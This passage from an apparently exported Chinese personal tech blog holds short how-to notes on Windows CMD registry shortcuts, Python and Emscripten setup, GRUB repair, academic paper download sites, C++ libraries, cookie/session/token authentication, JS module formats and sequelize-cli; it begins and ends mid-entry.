    <content type="text"><![CDATA[经常需要使用cmd命令，如果打开cmd窗口后在cd到目标路径，则非常麻烦。可使用如下方法将cmd添加到右键菜单，这样一打开cmd窗口就到了目标路径。设置方法如下： 打开注册表 添加注册项123a) 找到[HKEY_CLASSESS_ROOT\Folder\shell]子键，在其下新建“cmdPrompt”子项，在窗口右侧名称列上点击右键修改，将数值数据改为“CMD快速通道”。b) 再在这个项下，新建名为“command”子项，同样修改数值数据修改为c:\windows\system32\cmd.exe /k cd &quot;%1&quot; 设置完成后即可在目标路径文件夹上右键单击，选择“CMD快速通道”命令，打开cmd窗口的同时，已跳转到目标路径下。]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows平台Python安装与配置教程]]></title>
    <url>%2F2018%2F09%2F07%2FWindows%E5%B9%B3%E5%8F%B0Python%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[下面记录在Windows平台安装配置Python的过程。 去Python官网下载最新的Python3，当前最新版本为3.7。 双击Python3.7的安装包进行安装，设置安装路径为C:\Python\Python37，同时将Python路径加入系统Path变量中。 使用如下命令安装ipython。加参数—trusted-host，否则会报错误：SSLError(SSLCertVerificationError(1, ‘[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed。加参数-i，制定国内pip源，显著提高下载速度。1pip install ipython -i https://pypi.tuna.tsinghua.edu.cn/simple --trusted-host pypi.tuna.tsinghua.edu.cn]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows与Linux双系统Grub引导修复]]></title>
    <url>%2F2018%2F09%2F06%2FWindows%E4%B8%8ELinux%E5%8F%8C%E7%B3%BB%E7%BB%9FGrub%E5%BC%95%E5%AF%BC%E4%BF%AE%E5%A4%8D%2F</url>
    <content type="text"><![CDATA[因为个人爱好，我再笔记本中安装了Windows和Linux的双系统。最近因为Windows系统故障原因，重装Windows系统，导致无法引导Linux启动。 故障原因是之前安装双系统时，先安装Windows，再安装Linux，这样将由Grub2来引导Linux和Windows的启动。而重装Windows的过程中，将覆盖Grub2引导程序，导致无法Linux的启动。 故障解决方法是重新在硬盘中写入Grub2引导程序。具体步骤如下： 使用Linux安装盘，使用Live CD方式进行Linux系统。 使用fdisk -l命令查看硬盘信息。 使用grub-install —root-directory=/media/boot /dev/sda将grub2引导程序写入硬盘。/media/boot为引导分区所在位置，grub-install写入grub2引导程序时需要使用引导分区所在linux映像。 使用update-grub2更新引导配置。]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中文文献免费下载方法]]></title>
    <url>%2F2018%2F08%2F26%2F%E4%B8%AD%E6%96%87%E6%96%87%E7%8C%AE%E5%85%8D%E8%B4%B9%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[下面记录经过验证可用的中文文献下载方法: idata中国知网 1234idata中国知网网址：https://www.cn-ki.net/进入系统，注册账号，登陆就可以每天免费下载五篇知网论文。额度用完之后，第二天可以继续下载。每天五篇的额度基本能满足需要，这样还不够的话，可以多注册几个账号。 全国图书馆参考咨询联盟 123全国图书馆参考咨询联盟网址：http://www.ucdrs.superlib.net/很全，可以查图书，查期刊，报纸等。还有硕士，博士的毕业论文。不仅有中文，还有外文。网站无需注册，通过文献传递服务，即通过邮箱接收全文。最快一两分钟，最慢三四个小时即可接收到全文。 上海研发公共服务平台 123上海研发公共服务平台网址：http://www.sgst.cn/。注册后可直接下载，论文、文献数量直接匹配知网和万方数据。下载速度较快，但有数量限制，可注册多个用户名。 库问搜索 12库问搜索网址：http://www.koovin.com/。库问搜索提供千万级文献免费下载。]]></content>
      <tags>
        <tag>笔记本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++跨平台移植开发思考]]></title>
    <url>%2F2018%2F07%2F16%2FCPP%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%A7%BB%E6%A4%8D%E5%BC%80%E5%8F%91%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近需要将一份C++代码通过Emscripten编译成asm.js，结果失败，因为这份C++代码使用MFC GUI库，导致Emscripten编译失败。这引起了我对C++跨平台移植的思考。 C++代码理论上能实现源代码级别的跨平台移植，即同一份代码可以不加修改的在不同的平台上编译运行且表现一致。这要求编写的C++代码符合跨平台移植的规范，如链接[1]所指出的那样，它给出了很多实现C++代码跨平台移植的编码细节，在编写跨平台的底层库方面十分有用。但在编写跨平台的C++应用方面，应使用经过长期实践证明能用的跨平台库来帮助编码，建立在巨人的肩膀上，使跨平台C++代码编写工作变得简单容易。下面给出一些常用的跨平台C++库供参考： 语言及基础库 标准 C++：标准 c++ 是98年制定的，现在主流的 c++ 编译器都能够比较好的支持了。这里建议使用VC7.1和GCC4.0及以上版本。在Linux中，glibc是标准C的实现，libstdc++则是标准C++的实现。在Windows中，VS2015之前MSVCRT.DLL是标准C/C++的实现，之后UCRTBASE.DLLz则是标准C/C++的实现。 boost：boost 则是 C++ 标准委员会的一群人弄起来的一个 C++ 库集合，其中不少库以经进入 C++ TR1，可以说是准标准。使用这里的库我们有着充分的理由。象字符串的操作可以用 boost 的 String algorithms 库，格式化操作可以用 boost::format，正则式可用 boost::regex 等等。 网络 ACE（Adaptive Communication Environment）：ACE是一个以C++的Template技术所做成的开放源代码的可跨平台的网络应用程序的程式库套件。ACE自适配通信环境（ADAPTIVE Communication Environment）是可以自由使用、开放源码的面向对象（OO）框架（Framework），在其中实现了许多用于并发通信软件的核心模式。ACE提供了一组丰富的可复用C++ Wrapper Facade（包装外观）和框架组件，可跨越多种平台完成通用的通信软件任务，其中包括：事件多路分离和事件处理器分派、信号处理、服务初始化、进程间通信、共享内存管理、消息路由、分布式服务动态（重）配置、并发执行和同步，等等。 Boost.Asio：用于网络和底层I/O编程的跨平台的C++库 数据库 OTL (Oracle, Odbc and DB2-CLI Template Library)：不但支持跨平台，还跨数据库。OTL支持以下面的数据库 : OTL Oracle ,SQL Server, Access, MySQL。还有其它的库如DTL，这个库不但支持ODBC，它还支持数据库的原生接口，可以有更佳的性能。 GUI QT：QT是双认证的，当你的程序免费时它就免费，你的程序打算卖钱时，它也要，而且要价很高。所以，如果有版权，成本上的考虑的话，则可以考虑wxWidgets。 wxWidgets：wxWidgets（/wɪksˈwɪdʒɪts/，原名wxWindows）是一个开放源代码且跨平台的对象工具集（widget toolkit），其库可用来创建基本的图形用户界面（GUI）。wxWidgets由Julian Smart于1992年首先开发。 科学计算 GSL：GNU科学库。 游戏开发 Cocos2d-x：一个跨平台框架，用于构建2D游戏，互动图书，演示和其他图形应用程序。 视频 FFmpeg：一个完整的，跨平台的解决方案，用于记录，转换视频和音频流 参考文献 c++跨平台移植指南, by 洪柏敏. ACE自适配通信环境,by wikipedia. C++库汇总, by 工程师WWW. 值得推荐的C/C++框架和库, by zhihu. printf 格式化输出符号详细说明,by jackytse_. 理一理字节对齐的那些事,by 守望. 不见得你会计算C字符串长度,by veryitman. 浅析C语言之uint8_t / uint16_t / uint32_t /uint64_t,by 海阔天空sky1992. char，int，float，double所占字节数,by 张小铭. c++ 时间类型详解 time_t,by runoob. 网络传输——序列化,by bw_0927. 干货：构建C/C++良好的工程结构,by Froser.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Emscripten教程]]></title>
    <url>%2F2018%2F07%2F15%2FEmscripten%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Emscripten是一种基于LLVM的编译器，理论上能够将任何能够生成LLVM位码的代码编译成javascript的严格子集asm.js，实际上主要用于将C/C++代码编译成asm.js。本文主要介绍Emscripten的安装过程。 下载和安装从源码编译安装十分麻烦，推荐安装核心的Emscripten SDK。以Windows为例，先使用如下命令下载emsdk。12345# Get the emsdk repogit clone https://github.com/juj/emsdk.git# Enter that directorycd emsdk 再使用如下命令安装配置Emscripten。1234567891011# Fetch the latest registry of available tools..\emsdk.bat update# Download and install the latest SDK tools. Need install Python first. .\emsdk.bat install latest# Make the &quot;latest&quot; SDK &quot;active&quot; for the current user. (writes ~/.emscripten file).\emsdk.bat activate latest# Activate PATH and other environment variables in the current terminal.\emsdk_env.bat 验证使用如下命令验证Emscripten是否安装配置正确。12345678# Enter that directorycd emsdk# Activate PATH and other environment variables in the current terminal.\emsdk_env.bat# Verifying Emscriptenemcc.bat -v 运行如果验证通过，即可使用Emscripten编译C/C++代码到asm.js。 创建名为helloWorld.cpp的文件，其内容如下：123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;hello, world!\n&quot;); return 0;&#125; 使用如下命令编译：1emcc.bat helloWorld.cpp 编译后将生成a.out.js和a.out.wasm两个文件。后者是包含编译后代码的WebAssembly文件，前者是用于加载和执行后者的Javascipt文件。使用如下命令测试编译后生成的代码，将输出“hello,world!”。1node a.out.js 参考链接 http://kripken.github.io/emscripten-site/docs/introducing_emscripten/about_emscripten.html. by kripken.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器中运行3D游戏的思考]]></title>
    <url>%2F2018%2F07%2F10%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%BF%90%E8%A1%8C3D%E6%B8%B8%E6%88%8F%E7%9A%84%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[Web技术突飞猛进，几乎无所不能，无所不在。然而在3D游戏领域，web技术乏善可陈，性能瓶颈问题制约其发展。但是开发者们没有放弃这个梦想，不断努力，孜孜不倦地改进和增强浏览器中运行3D游戏性能的方法和技术，目前已能看到一丝曙光。 对C/S架构的3D游戏而言，渲染和计算通常都在客户端，服务器端负责用户状态的管理和分发。同样对B/S架构的运行在浏览器中的3D游戏，所有的渲染和计算也应该在浏览器端。如果渲染和计算放在服务器端，将导致可怕的延迟，并严重损害3D游戏的可伸缩性。 当前很多3D游戏使用C/C++语言编写，如果能够将C/C++语言编译成JavaScript语言，可大大促进Web 3D游戏的开发。而编译器项目Emscripten正是一个这样的工具。它能将C/C++代码编译成一种叫做asm.js的Javascript变体。需要指出的是，Emscripten的输入，即C/C++代码最好是开放源代码的，因为Emscripten不支持闭源代码的编译。例如Emscripten不支持mfc程序的转换，因为mfc是闭源的[4]。 asm.js是一个JavaScript的严格子集，它只提供32位带符号整数和64位带符号浮点数两种数据类型，其他Javascript类型如字符串、布尔值等以数值形式存在，保存在内存中，通过TypedArray调用。另外asm.js没有垃圾回收机制，所有内存操作都由程序员自己控制。asm.js是优化后的JavaScript，它在浏览器中的运行速度大约是原生代码的一倍左右[1]。 asm.js虽然比原生javascript运行速度快了一倍左右，但是相比C/C++代码，运行速度还是有差距。幸运的是出现了名为WebAssembly的技术。WebAssembly或称wasm是一个实验性的低级编程语言，应用于浏览器内的客户端[5]。WebAssembly是便携式的抽象语法树，被设计来提供比JavaScript更快速的编译及运行。WebAssembly将让开发者能运用自己熟悉的编程语言（最初以C/C++作为实现目标）编译，再藉虚拟机引擎在浏览器内运行。WebAssembly的开发团队分别来自Mozilla、Google、Microsoft、Apple，代表着四大网络浏览器Firefox、Chrome、Microsoft Edge、Safari。2017年11月，所有以上四个浏览器都开始实验性的支持WebAssembly。目前，最新版本的Emscripten已支持将C/C++代码编译成wasm。 参考文献 http://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html. by 阮一峰. https://www.cnblogs.com/slly/p/6639173.html. by 李某龙. http://kripken.github.io/emscripten-site/. by emscripten. https://github.com/kripken/emscripten/issues/941. by emscripten. https://zh.wikipedia.org/wiki/WebAssembly. by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie,Session和Token会话知识整理]]></title>
    <url>%2F2018%2F07%2F08%2FCookie-Session%E5%92%8CToken%E4%BC%9A%E8%AF%9D%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[HTTP是一种无状态的协议，然而当服务器端需要判断用户能否访问某些资源，记录用户的购物车内容等场景时，就需要一种机制维护会话状态，这时候Cookie、Session和Token就派上了用场。 CookieCookie技术最早用于解决HTTP的会话问题， 它是 http 协议的一部分，它的处理分为如下几步： 服务器向客户端发送 cookie。 通常使用 HTTP 协议规定的 set-cookie 头操作。 规范规定 cookie 的格式为 name = value 格式，且必须包含这部分。 浏览器将 cookie 保存。 每次请求浏览器都会将 cookie 发向服务器。 可选的Cookie参数其他可选的 cookie 参数会影响将 cookie 发送给服务器端的过程，主要有以下几种： path：表示 cookie 影响到的路径，匹配该路径才发送这个 cookie。 expires 和 maxAge：告诉浏览器这个 cookie 什么时候过期，expires 是 UTC 格式时间，maxAge 是 cookie 多久后过期的相对时间。当不设置这两个选项时，会产生 session cookie，session cookie 是 transient 的，当用户关闭浏览器时，就被清除。一般用来保存 session 的 session_id。 secure：当 secure 值为 true 时，cookie 在 HTTP 中是无效，在 HTTPS 中才有效。 httpOnly：浏览器不允许脚本操作 document.cookie 去更改 cookie。一般情况下都应该设置这个为 true，这样可以避免被 xss 攻击拿到 cookie。 常用场景当给Cookie设置expires和maxAge后，在未到期前，浏览器端的Cookie不会因为浏览器的关闭而消失。该特性常用于自动登录，记录用户浏览信息。例如很多购物网站常用该特性记录用户的喜好和购买的物品。 Cookie安全隐患Cookie提供了一种手段使得HTTP请求可以附加当前状态， 大多数网站就是靠Cookie来标识用户的登录状态的，例如： 用户提交用户名和密码的表单，这通常是一个POST HTTP请求。 服务器验证用户名与密码，如果合法则返回200（OK）并设置Set-Cookie为authed=true。 浏览器存储该Cookie。 浏览器发送请求时，设置Cookie字段为authed=true。 服务器收到第二次请求，从Cookie字段得知该用户已经登录。 按照已登录用户的权限来处理此次请求。 上述认证流程存在安全隐患，因为Cookie是可以被篡改的。如果使用一些HTTP客户端软件，设置Cookie字段为authed=true并发送该HTTP请求，服务器就会被欺骗。 Cookie防篡改机制服务器为每个Cookie项生成签名，可有效地防止Cookie被篡改。因为用户篡改Cookie后无法生成对应的签名， 服务器便可得知用户对Cookie进行了篡改。一个简单的校验过程可能是这样的： 在服务器中配置一个不为人知的字符串（我们叫它Secret），比如：x$sfz32。 当服务器需要设置Cookie时（比如authed=false），不仅设置authed的值为false， 在值的后面进一步设置一个签名，最终设置的Cookie是authed=false|6hTiBl7lVpd1P。 签名6hTiBl7lVpd1P是这样生成的：Hash(‘x$sfz32’+’false’)。 要设置的值与Secret相加再取哈希。 用户收到HTTP响应并发现头字段Set-Cookie: authed=false|6hTiBl7lVpd1P。 用户在发送HTTP请求时，篡改了authed值，设置头字段Cookie: authed=true|???。 因为用户不知道Secret，无法生成签名，只能随便填一个。 服务器收到HTTP请求，发现Cookie: authed=true|???。服务器开始进行校验： Hash(‘true’+’x$sfz32’)，便会发现用户提供的签名不正确。 通过给Cookie添加签名，使得服务器得以知道Cookie被篡改。然而故事并未结束。 因为Cookie是明文传输的， 只要服务器设置过一次authed=true|xxxx我不就知道true的签名是xxxx了么， 以后就可以用这个签名来欺骗服务器了。因此Cookie中最好不要放敏感数据。 一般来讲Cookie中只会放一个Session Id，而Session存储在服务器端。 Session为了解决Cookie的安全隐患，Session机制应运而生。session机制是一种服务器端的机制，它存储在服务器端的，避免了在客户端Cookie中存储敏感数据。Session可以存储在HTTP服务器的内存中，也可以存在内存数据库（如redis）中， 对于重量级的应用甚至可以存储在数据库中。 客户端对服务端请求时,服务端会检查请求中是否包含一个session标识( 称为session id ). 如果没有,那么服务端就生成一个随机的session以及和它匹配的session id,并将session id返回给客户端. 如果有,那么服务器就在存储中根据session id 查找到对应的session. 基于Session的登录流程一个简单的使用Session机制的登录流程可能是这样的： 用户提交包含用户名和密码的表单，发送HTTP请求。 服务器验证用户发来的用户名密码。 如果正确则把当前用户名（通常是用户对象）存储到redis中，并生成它在redis中的ID。这个ID称为Session ID，通过Session ID可以从Redis中取出对应的用户对象， 敏感数据（比如authed=true）都存储在这个用户对象中。 设置Cookie为sessionId=xxxxxx|checksum并发送HTTP响应， 仍然为每一项Cookie都设置签名。 用户收到HTTP响应后，便看不到任何敏感数据了。在此后的请求中发送该Cookie给服务器。 服务器收到此后的HTTP请求后，发现Cookie中有SessionID，进行放篡改验证。 如果通过了验证，根据该ID从Redis中取出对应的用户对象， 查看该对象的状态并继续执行业务逻辑。 Session安全隐患Session ID作为Cookie存储在浏览器端，因此存在被劫持的风险，尤其是开发者没有正确的关闭会话。用户关闭会话时，应删除传递 Session ID 的 Cookie，同时撤销服务器端的Session内容。例如：123456789101112/* 普通用户登出 */router.post(&apos;/signout&apos;, function(req, res, next) &#123; if (_.isEmpty(req.body) === false) &#123; req.session.account = null; // 删除session res.json(&#123; message: &apos;登出成功！&apos; &#125;); &#125; else &#123; res.send(406, &#123; message: &apos;The params is not correct!&apos; &#125;); &#125;&#125;); TokenToken是用户的验证方式,最简单的token组成:uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign(签名，由token的前几位+盐以哈希算法压缩成一定长的十六进制字符串，可以防止恶意第三方拼接token请求服务器)。 基于Token的身份验证流程使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端 客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 Token 服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据 基于Token方法的优势 JWT 方法允许我们进行AJAX调用任何服务器或域。由于HTTP头是用来传输用户信息的。 没必要在服务器存储一个单独的session。JWT本身传达全部的信息。 服务器端减少到只是一个API和可以通过CDN服务的静态资源（HTML，CSS，JS)。 认证系统是手机兼容的，任何设备上可以生成令牌。 由于已经消除了cookie的需要，也不再需要保护跨站请求。 API密钥提供非此即彼的解决方案，然而JWT提供更颗粒度的控制，它可以用于任何调试目的的检查。 API密钥依赖于中央存储和服务。JWT可以自发行或者外部服务在允许的范围和期限发布它。 JWT结构Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 一个JWT实际上就是一个字符串，它由三部分组成，头部、载荷与签名。 Cookie、Session和Token对比cookie与session的区别 cookie数据存放在客户端上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗。考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE。 session与token的区别作为身份认证token安全性比session好，因为每个请求都有签名还能防止监听以及重放攻击。 Session 是一种HTTP存储机制，目的是为无状态的HTTP提供的持久机制。Session 认证只是简单的把User 信息存储到Session 里，因为SID 的不可预测性，暂且认为是安全的。这是一种认证手段。 但是如果有了某个User的SID,就相当于拥有该User的全部权利.SID不应该共享给其他网站或第三方。 Token, 如果指的是OAuth Token 或类似的机制的话，提供的是 认证 和 授权，认证是针对用户，授权是针对App。其目的是让某App有权利访问某用户的信息。这里的Token是唯一的。不可以转移到其它App上，也不可以转到其它用户上。 参考链接 cookie 和 session, by 极客学院. Cookie/Session的机制与安全, by Harttle Land. Python中关于JSON网络令牌的实例教程, by Python部落. 什么是 JWT — JSON WEB TOKEN, by Dearmadman JSON Web Token 入门教程,by 阮一峰.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[兼容前后端多种JS模块规范的代码]]></title>
    <url>%2F2018%2F07%2F02%2F%E5%85%BC%E5%AE%B9%E5%89%8D%E5%90%8E%E7%AB%AF%E5%A4%9A%E7%A7%8DJS%E6%A8%A1%E5%9D%97%E8%A7%84%E8%8C%83%E7%9A%84%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[最近研究如何在前后端调用同一份js代码。该问题本质是如何兼容前后端各类JS模块规范。上网一搜，已经有很多详细的解决方案和JS模块规范介绍，在这里简单记录一下。 JS模块规范JS模块规范前端主要有AMD、CMD，后端主要有CommonJS。此外还有最新的ES2015模块规范。 AMDAMD（异步模块定义，Asynchronous Module Definition）格式总体的目标是为现在的开发者提供一个可用的模块化 JavaScript 的解决方案。它诞生于 Dojo 在使用 XHR+eval 时的实践经验，其支持者希望未来的解决方案都可以免受由于过去方案的缺陷所带来的麻烦。 AMD风格模块定义通常包括：一个用来进行模块定义的 define 方法以及一个用来处理依赖项加载的 require 方法。define 根据如下的方法签名来定义具名或匿名的模块：12345define( module_id /*可选*/, [dependencies] /*可选*/, definition function /*用来初始化模块或对象的函数*/); CMDCMD(Common Module Definition)表示通用模块定义，该规范是国内发展出来的，由阿里的玉伯提出。就像AMD有个requireJS，CMD有个浏览器的实现SeaJS，SeaJS和requireJS一样，都是javascript的前端模块化解决方案。CMD规范简单到只有一个API，即define函数：12345define(function(require, exports, module) &#123; // The module code goes here&#125;); CMD 与 AMD 挺相近，二者区别如下： 对于依赖的模块 CMD 是延迟执行，而 AMD 是提前执行（不过 RequireJS 从 2.0 开始，也改成可以延迟执行。 ） CMD 推崇依赖就近，AMD 推崇依赖前置。 AMD 的 api 默认是一个当多个用，CMD 严格的区分推崇职责单一，其每个 API 都简单纯粹。例如：AMD 里 require 分全局的和局部的。CMD 里面没有全局的 require，提供 seajs.use() 来实现模块系统的加载启动。 CommonJSCommonJS是一个志愿性质的工作组，它致力于设计、规划并标准化 JavaScript API。至今为止他们已经尝试着认可了模块标准以及程序包标准。CommonJS 的模块提案为在服务器端声明模块指定了一个简单的 API。不像 AMD，它试图覆盖更宽泛的方面比如 IO、文件系统、promise 模式等等。CommonJS风格模块在nodejs中得到广泛的应用。 CommonJS风格模块是一段可重用的 JavaScript，它导出一系列特定的对象给依赖它的代码调用——通常来说这样的模块外围没有函数包裹（所以你在这里的例子中不会看到 define）。例如：12345678910// package/lib 是我们须要的一个依赖项var lib = require(&apos;package/lib&apos;); // 我们的模块的一些行为function foo()&#123; lib.log(&apos;hello world!&apos;);&#125; // 把 foo 导出（暴露）给其它模块exports.foo = foo; ES2015模块规范2015 年 6 月， ES2015（即 ECMAScript 6、ES6） 正式发布。ES2015 是该语言的一个显著更新，也是自 2009 年 ES5 标准确定后的第一个重大更新。 ES2015的模块规范如下： 一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。 export 命令用于规定模块的对外接口。 import 命令用于输入其他模块提供的功能。 ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。 ES2015模块示例如下：123456789//circle.js//圆面积计算export function area(radius) &#123; return Math.PI * radius * radius;&#125;//main.jsimport &#123;area&#125; from &apos;./hangge&apos;;console.log(&apos;圆面积：&apos; + area(10)); 兼容多种模块规范需要指出的是下面兼容多种JS模块规范的代码并不支持最新的ES2015模块规范。 1234567891011121314151617181920;(function (name, definition) &#123; // 检测上下文环境是否为AMD或CMD var hasDefine = typeof define === &apos;function&apos;, // 检查上下文环境是否为Node hasExports = typeof module !== &apos;undefined&apos; &amp;&amp; module.exports; if (hasDefine) &#123; // AMD环境或CMD环境 define(definition); &#125; else if (hasExports) &#123; // 定义为普通Node模块 module.exports = definition(); &#125; else &#123; // 将模块的执行结果挂在window变量中，在浏览器中this指向window对象 this[name] = definition(); &#125;&#125;)(&apos;hello&apos;, function () &#123; var hello = function () &#123;&#125;; return hello;&#125;); Webpack兼容所有JS模块规范webpack根据webpack.config.js中的入口文件，在入口文件里识别模块依赖，不管这里的模块依赖是用CommonJS写的，还是ES6 Module规范写的，webpack会自动进行分析，并通过转换、编译代码，打包成最终的文件。最终文件中的模块实现是基于webpack自己实现的webpack_require（es5代码），所以打包后的文件可以跑在浏览器上。 同时以上意味着在webapck环境下，你可以只使用ES6 模块语法书写代码（通常我们都是这么做的），也可以使用CommonJS模块语法，甚至可以两者混合使用。因为从webpack2开始，内置了对ES6、CommonJS、AMD 模块化语句的支持，webpack会对各种模块进行语法分析，并做转换编译。 具体Webpack兼容所有JS模块规范的原理分析参见Webpack 模块打包原理。 参考链接 兼容前后端共用模块代码(摘自《深入浅出Node.js》), by Jake. 兼容多种模块规范(AMD,CMD,Node)的代码, by CodeMan. 使用 AMD、CommonJS 及 ES Harmony 编写模块化的 JavaScript, by ADDY OSMANI. JS - CommonJS、ES2015、AMD、CMD模块规范对比与介绍（附样例）,by hangge. What is Babel?,by Babel. Webpack Concepts,by webpack. import、require、export、module.exports 混合使用详解,by lv_DaDa. Webpack 模块打包原理,by lq782655835.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sequelize-cli使用经验总结]]></title>
    <url>%2F2018%2F06%2F22%2Fsequelize-cli%E4%BD%BF%E7%94%A8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Sequelize 是一个基于 promise 的 Node.js ORM, 目前支持 Postgres, MySQL, SQLite 和 Microsoft SQL Server. 它具有强大的事务支持, 关联关系, 读取和复制等功能[2]. 下面主要介绍如何使用sequelize-cli工具快速构建nodejs的数据访问层。 基于express创建nodejs web应用基于express建立nodejs的web应用，在此基础上再使用sequlize建立数据访问层和数据库。1234mkdir myappcd myappexpressnpm install 基于sequelize创建数据访问层和数据库安装sequlize12npm install --save sequelizenpm install --save mysql2 安装sequelize-cli首先应安装sequelize-cli工具，可以选择全局安装，也可以选择本地安装。12npm install --save-dev sequelize-clinpm install -g sequelize-cli 建立初始的ORM引导框架使用如下命令在Nodejs Web应用中建立初始的数据访问层。123mkdir dbcd db../node_modules/.bin/sequelize init 这将创建以下文件夹: config, 包含配置文件，它告诉CLI如何连接数据库 models,包含您的项目的所有模型 migrations, 包含所有迁移文件 seeders, 包含所有种子文件 修改配置文件以连接到数据库管理系统，并创建数据库在建立模型之前，应先修改config/config.json，以告诉 CLI 如何连接到数据库。config/config.json内容如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&#123; &quot;development&quot;: &#123; &quot;username&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;, &quot;database&quot;: &quot;database_development&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;dialect&quot;: &quot;mysql&quot;, &quot;pool&quot;:&#123; &quot;max&quot;: 5, &quot;min&quot;: 0, &quot;idle&quot;: 10000 &#125;, &quot;timezone&quot;: &quot;+08:00&quot;, &quot;define&quot;:&#123; &quot;charset&quot;: &quot;utf8&quot;, &quot;dialectOptions&quot;:&#123; &quot;collate&quot;: &quot;utf8_general_ci&quot; &#125; &#125; &#125;, &quot;test&quot;: &#123; &quot;username&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;, &quot;database&quot;: &quot;database_test&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;dialect&quot;: &quot;mysql&quot; &#125;, &quot;production&quot;: &#123; &quot;username&quot;: &quot;root&quot;, &quot;password&quot;: &quot;root&quot;, &quot;database&quot;: &quot;database_test&quot;, &quot;host&quot;: &quot;127.0.0.1&quot;, &quot;dialect&quot;: &quot;mysql&quot;, &quot;pool&quot;:&#123; &quot;max&quot;: 5, &quot;min&quot;: 0, &quot;idle&quot;: 10000 &#125;, &quot;timezone&quot;: &quot;+08:00&quot;, &quot;define&quot;:&#123; &quot;charset&quot;: &quot;utf8&quot;, &quot;dialectOptions&quot;:&#123; &quot;collate&quot;: &quot;utf8_general_ci&quot; &#125; &#125; &#125;&#125; 上述配置修改了数据库的字符集，使之能支持中文。当然在创建数据库之前，应配置mysql数据库管理系，使其支持utf8字符集。可执行如下命令查看其支持的字符集，如果其不支持uft字符集，请按照参考链接[3]进行修改。1234567891011121314mysql&gt; show variables like &apos;%char%&apos;;+--------------------------+---------------------------------------------------------+| Variable_name | Value |+--------------------------+---------------------------------------------------------+| character_set_client | utf8 || character_set_connection | utf8 || character_set_database | utf8 || character_set_filesystem | binary || character_set_results | utf8 || character_set_server | utf8 || character_set_system | utf8 || character_sets_dir | C:\Program Files\MySQL\MySQL Server 5.5\share\charsets\ |+--------------------------+---------------------------------------------------------+8 rows in set (0.00 sec) 使用如下命令创建数据库：1../node_modules/.bin/sequelize db:create 使用如下命令删除数据库：1../node_modules/.bin/sequelize db:drop 创建模型我们将使用 model:generate 命令。 此命令需要两个选项： name, 模型的名称 attributes, 模型的属性列表 创建一个名叫 User 的模型：1../node_modules/.bin/sequelize model:generate --name User --attributes firstName:string,lastName:string,email:string 这将发生以下事情: 在 models 文件夹中创建了一个 user 模型文件 在 migrations 文件夹中创建了一个名字像 XXXXXXXXXXXXXX-create-user.js 的迁移文件 注意: _Sequelize 将只使用模型文件，它是表描述。另一边，迁移文件是该模型的更改，或更具体的是说 CLI 所使用的表。 处理迁移，如提交或日志，以进行数据库的某些更改。 再创建一个名为Role的模型，它跟User是一对多的关系：1../node_modules/.bin/sequelize model:generate --name Role --attributes roleName:string 定义关系Role和User是一对多的关系，因此需要修改它们的模型定义。修改models/role.js如下：1234567891011&apos;use strict&apos;;module.exports = (sequelize, DataTypes) =&gt; &#123; var Role = sequelize.define(&apos;Role&apos;, &#123; roleName: DataTypes.STRING &#125;, &#123;&#125;); 